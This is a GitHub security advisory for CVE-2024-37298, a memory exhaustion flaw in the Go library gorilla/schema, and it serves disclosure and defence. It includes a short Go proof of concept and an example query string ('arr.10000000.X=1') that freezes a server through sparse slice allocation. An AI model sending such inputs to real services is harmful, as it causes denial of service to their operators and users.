# [H] Potential memory exhaustion attack due to sparse slice deserialization

## Summary
Severity: High
Advisory: GHSA-3669-72x9-r9p3
CVE: CVE-2024-37298
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-07-01
Source: https://github.com/advisories/GHSA-3669-72x9-r9p3
Type: github-advisory

## Affected
- Go: `github.com/gorilla/schema` — affected >=0 <1.4.1

## Details
### Details

Running `schema.Decoder.Decode()` on a struct that has a field of type `[]struct{...}` opens it up to malicious attacks regarding memory allocations, taking advantage of the sparse slice functionality. For instance, in the Proof of Concept written below, someone can specify to set a field of the billionth element and it will allocate all other elements before it in the slice. 

In the local environment environment for my project, I was able to call an endpoint like `/innocent_endpoint?arr.10000000.X=1` and freeze my system from the memory allocation while parsing `r.Form`. I think [this line](https://github.com/gorilla/schema/blob/main/decoder.go#L223) is responsible for allocating the slice, although I haven't tested to make sure, so it's just an educated guess.

### Proof of Concept

The following proof of concept works on both v1.2.0 and v1.2.1. I have not tested earlier versions.

```go
package main

import (
	"fmt"

	"github.com/gorilla/schema"
)

func main() {
	dec := schema.NewDecoder()
	var result struct {
		Arr []struct{ Val int }
	}
	if err := dec.Decode(&result, map[string][]string{"arr.1000000000.Val": {"1"}}); err != nil {
		panic(err)
	}
	fmt.Printf("%#+v\n", result)
}

```

### Impact

Any use of `schema.Decoder.Decode()` on a struct with arrays of other structs could be vulnerable to this memory exhaustion vulnerability. There seems to be no possible solution that a developer using this library can do to disable this behaviour without fixing it in this project, so all uses of Decode that fall under this umbrella are affected. A fix that doesn't require a major change may also be harder to find, since it could break compatibility with some other intended use-cases.

## References
- https://github.com/gorilla/schema/security/advisories/GHSA-3669-72x9-r9p3
- https://nvd.nist.gov/vuln/detail/CVE-2024-37298
- https://github.com/gorilla/schema/commit/cd59f2f12cbdfa9c06aa63e425d1fe4a806967ff
- https://github.com/gorilla/schema
- https://github.com/gorilla/schema/blob/main/decoder.go#L223
